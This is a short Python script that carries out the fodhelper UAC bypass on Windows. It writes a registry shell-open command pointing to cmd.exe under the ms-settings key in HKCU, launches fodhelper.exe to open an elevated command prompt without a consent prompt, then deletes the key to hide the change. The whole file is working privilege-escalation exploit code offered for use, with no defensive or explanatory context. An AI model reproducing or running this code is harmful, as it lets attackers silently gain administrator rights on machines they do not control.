import ctypes
import platform

def is_admin():
    if platform.system() != 'Windows':
        return False
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def uac_bypass():
    if platform.system() != 'Windows':
        return {'status': 'failed'}
    try:
        import winreg
        reg_path = r"Software\Classes\ms-settings\shell\open\command"
        
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "cmd.exe")
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        import subprocess
        subprocess.run(["fodhelper.exe"], creationflags=8, check=False)
        
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
        except:
            pass
        
        return {'status': 'success'}
    except Exception as e:
        return {'status': 'failed', 'error': str(e)}

if __name__ == "__main__":
    print(f"Admin: {is_admin()}")
    if not is_admin():
        print(f"UAC bypass: {uac_bypass()}")